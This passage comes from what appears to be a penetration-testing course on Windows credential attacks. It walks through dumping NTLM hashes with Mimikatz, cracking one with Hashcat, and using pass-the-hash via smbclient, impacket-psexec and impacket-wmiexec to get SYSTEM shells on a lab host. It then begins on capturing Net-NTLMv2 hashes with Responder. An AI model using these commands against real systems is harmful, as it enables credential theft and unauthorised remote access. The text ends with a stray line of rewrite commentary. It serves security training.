### Enabling SeDebugPrivilege, Elevating to SYSTEM User Privileges, and Extracting NTLM Hashes

**Listing 292: Enabling SeDebugPrivilege, Elevating to SYSTEM User Privileges, and Extracting NTLM Hashes**

The output indicates that we successfully enabled the SeDebugPrivilege access right and obtained SYSTEM user privileges. The `lsadump::sam` command revealed two NTLM hashes, one for the `offsec` user and one for the `nelly` user. Since we already know that the NTLM hash of `offsec` was derived from the plaintext password "lab," we will focus on cracking `nelly`'s NTLM hash.

Let's copy the NTLM hash and save it in a file named `nelly.hash` in the `passwordattacks` directory on our Kali machine.

```bash
kali@kali:~/passwordattacks$ cat nelly.hash
3ae8e5f0ffabb3a627672e1600f1ba10
```

**Listing 293: NTLM Hash of User `nelly` in `nelly.hash`**

Next, we need to determine the correct hash mode from Hashcat’s help output.

```bash
kali@kali:~/passwordattacks$ hashcat --help | grep -i "ntlm"
5500 | NetNTLMv1 / NetNTLMv1+ESS | Network Protocol
27000 | NetNTLMv1 / NetNTLMv1+ESS (NT) | Network Protocol
5600 | NetNTLMv2 | Network Protocol
27100 | NetNTLMv2 (NT) | Network Protocol
1000 | NTLM | Operating System
```

**Listing 294: Hashcat Mode for NTLM Hashes**

The correct mode for NTLM hashes is `1000`.

We now have all the necessary information to start cracking the NTLM hash. We have already extracted the hash, and Mimikatz outputs a format that Hashcat accepts. For this example, we will use the `rockyou.txt` wordlist and the `best64.rule` rule file, which contains 64 effective rules.

Let's run the Hashcat command with the appropriate arguments.

```bash
kali@kali:~/passwordattacks$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat (v6.2.5) starting...
3ae8e5f0ffabb3a627672e1600f1ba10:nicole1
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
Time.Started.....: Thu Jun 2 04:11:28 2022, (0 secs)
Time.Estimated...: Thu Jun 2 04:11:28 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 17926.2 kH/s (2.27ms) @ Accel:256 Loops:77 Thr:1 Vec:8
```

**Listing 295: NTLM Hash of User `nelly` in `nelly.hash` and Hashcat Mode**

The output shows that we successfully cracked the NTLM hash of the `nelly` user. The plaintext password used to create this hash is `nicole1`. Let's confirm this by connecting to the system via RDP.

**Figure 219: RDP Connection as `nelly`**

Great! We successfully cracked the NTLM hash and used the password to log in via RDP.

In this section, we gained a basic understanding of SAM and NTLM hashes. We demonstrated how to use Mimikatz to obtain NTLM hashes and followed our cracking methodology to crack the hash. While this was done on a local system without an Active Directory environment, the process applies to enterprise environments and is a crucial skill for real-life penetration tests. In the next section, we will demonstrate how to leverage NTLM hashes even if we are unable to crack them.

### Passing NTLM Hashes

**13.3.2 Passing NTLM**

In the previous section, we obtained and cracked an NTLM hash. Depending on the password strength, this may be time-consuming or unfeasible. In this section, we will demonstrate how to leverage an NTLM hash without cracking it.

First, we will demonstrate the pass-the-hash (PtH) technique. This technique allows us to authenticate to a local or remote target using a valid combination of a username and NTLM hash instead of a plaintext password. This is possible because NTLM/LM password hashes are not salted and remain static between sessions. If we discover a password hash on one target, we can use it to authenticate to another target, provided the second target has an account with the same username and password. To execute code, the account must also have administrative privileges on the second target.

If we do not use the local Administrator user in pass-the-hash, the target machine must be configured in a certain way to allow successful code execution. Since Windows Vista, all Windows versions have UAC remote restrictions enabled by default, which prevents software or commands from running with administrative rights on remote systems. This mitigates the attack vector for users in the local administrator group, except for the local Administrator account.

In this demonstration, let's assume we have already gained access to `FILES01` and obtained the password (`password123!`) for the `gunther` user. Our goal is to extract the Administrator’s NTLM hash and use it to authenticate to the `FILES02` machine, gain access to a restricted SMB share, and leverage pass-the-hash to obtain an interactive shell on `FILES02`.

We will assume that the local Administrator accounts on both machines, `FILES01` and `FILES02`, have the same password, which is common in real-life assessments.

**Connecting to `FILES01` and Attempting Access to SMB Share**

First, we connect to `FILES01` (192.168.50.211) with RDP using the `gunther` username and `password123!` as the password. We then start Windows Explorer and enter the path of the SMB share (`\\192.168.50.212\secrets`) in the navigation bar. After entering the command, we are prompted for credentials to connect to the share.

When we enter the `gunther` user credentials, we are notified that Windows cannot access this share, indicating that the user account does not exist on `FILES02` or does not have the necessary permissions.

**Obtaining the NTLM Hash of the Administrator Account**

Next, we use Mimikatz to obtain the NTLM hash of the `Administrator` account. Mimikatz is located in `C:\tools` on `FILES01`. We open a PowerShell window as `Administrator` and run the following commands:

```bash
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # token::elevate
...
mimikatz # lsadump::sam
...
RID : 000001f4 (500)
User : Administrator
Hash NTLM: 7a38310ea6f0027ee955abed1762964b
...
```

**Listing 296: Enabling SeDebugPrivilege, Retrieving SYSTEM User Privileges, and Extracting NTLM Hashes**

We save the `Administrator` NTLM hash for later use.

To leverage pass-the-hash (PtH), we need tools that support authentication with NTLM hashes. We have several options, such as `smbclient` or `CrackMapExec` for SMB enumeration and management, and scripts from the `impacket` library like `psexec.py` and `wmiexec.py` for command execution. We can also use NTLM hashes to connect to target systems via other protocols like RDP and WinRM, if the user has the required rights. Mimikatz can also be used to conduct pass-the-hash.

Since our first goal is to gain access to an SMB share by providing an NTLM hash, we will use `smbclient`.

To use the command, we need to escape the backslashes in the share path and specify the user and NTLM hash. For example:

```bash
kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
Try "help" to get a list of possible commands.
smb: \> dir
. D 0 Thu Jun 2 16:55:37 2022
.. DHS 0 Thu Jun 2 16:55:35 2022
secrets.txt A 4 Thu Jun 2 11:34:47 2022
4554239 blocks of size 4096. 771633 blocks available
smb: \> get secrets.txt
getting file \secrets.txt of size 4 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

**Listing 297: Using `smbclient` with NTLM Hash**

We successfully connected to the SMB share by providing the NTLM hash instead of a password. The directory listing reveals a `secrets.txt` file, which we downloaded and viewed.

**Obtaining an Interactive Shell Using `psexec.py`**

In the second part, our goal is to obtain an interactive shell. We will use the `psexec.py` script from the `impacket` library. This script is similar to the original Sysinternals PsExec command. It searches for a writable share, uploads an executable file, registers it as a Windows service, and starts it to obtain an interactive shell or code execution.

We can use the `impacket-scripts` package on Kali to execute `psexec.py`. The command requires two main arguments: `-hashes` to specify the NTLM hash and the target definition in the format `username@ip`.

```bash
kali@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Requesting shares on 192.168.50.212.....
[*] Found writable share ADMIN$
[*] Uploading file nvaXenHl.exe
[*] Opening SVCManager on 192.168.50.212.....
[*] Creating service MhCl on 192.168.50.212.....
[*] Starting service MhCl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32> hostname
FILES02
C:\Windows\system32> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
Connection-specific DNS Suffix . :
Link-local IPv6 Address . . . . . : fe80::7992:61cd:9a49:9046%4
IPv4 Address. . . . . . . . . . . : 192.168.50.212
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 192.168.50.254
C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> exit
kali@kali:~$
```

**Listing 298: Using `psexec` to Get an Interactive Shell**

We successfully obtained an interactive shell on `FILES02` as the `SYSTEM` user.

**Obtaining an Interactive Shell Using `wmiexec.py`**

We can also use `wmiexec.py` from the `impacket` library to obtain a shell as the user we used for authentication. On Kali, we would use `impacket-wmiexec` with the same arguments.

```bash
kali@kali:~$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
files02\administrator
C:\>
```

**Listing 299: Using `wmiexec` to Get an Interactive Shell**

As the `whoami` output shows, we obtained a shell as the `Administrator` user with `wmiexec`.

In this section, we used pass-the-hash to gain access to an SMB share and then used the hash to obtain an interactive shell with `impacket-psexec` and `impacket-wmiexec`.

### Cracking Net-NTLMv2

**13.3.3 Cracking Net-NTLMv2**

In some penetration tests, we may obtain code execution or a shell on a Windows system as an unprivileged user, preventing the use of tools like Mimikatz to extract passwords or NTLM hashes. In such situations, we can abuse the Net-NTLMv2 network authentication protocol, which manages the authentication process for Windows clients and servers over a network.

We use "Net-NTLMv2" to refer to the formally correct NTLMv2. Since "Net-NTLMv2" is more commonly used in our industry, we use it in this course to avoid confusion.

Let's walk through an example to understand the basics of the authentication process. Our goal is to gain access to an SMB share on a Windows 2022 server from a Windows 11 client via Net-NTLMv2.

At a high level, we send the server a request outlining the connection details to access the SMB share. The server then sends us a challenge, and we encrypt data for our response using our NTLM hash to prove our identity. The server checks our challenge response and either grants or denies access accordingly.

However, our specific goal is to use Net-NTLMv2 for this exercise since it is less secure than the more modern Kerberos protocol. This is common in real-world scenarios, as many Windows environments still rely on the older protocol, especially to support older devices that may not support Kerberos.

Since we will find Net-NTLMv2 in nearly all Windows networks and environments, it is vital to understand how to abuse its weaknesses. To do this, we need our target to start an authentication process using Net-NTLMv2 against a system we control. We need to prepare our system to handle the authentication process and capture the Net-NTLMv2 hash the target uses to authenticate.

The Responder tool is excellent for this. It includes a built-in SMB server that handles the authentication process and prints all captured Net-NTLMv2 hashes. While it also includes other protocol servers (including HTTP and FTP) and poisoning capabilities (LLMNR, NBT-NS, and MDNS), we will focus on capturing Net-NTLMv2 hashes with the SMB server in this section.

If we have obtained code execution on a remote system, we can easily force it to authenticate with us by commanding it to connect to our prepared SMB server. For example, we can run `ls \\192.168.119.2\share` in PowerShell, assuming our Responder is listening on that IP. If we do not have code execution, we can use other vectors to force an authentication, such as...

---

This revised text is more structured, clear, and professional, making it easier to follow and understand.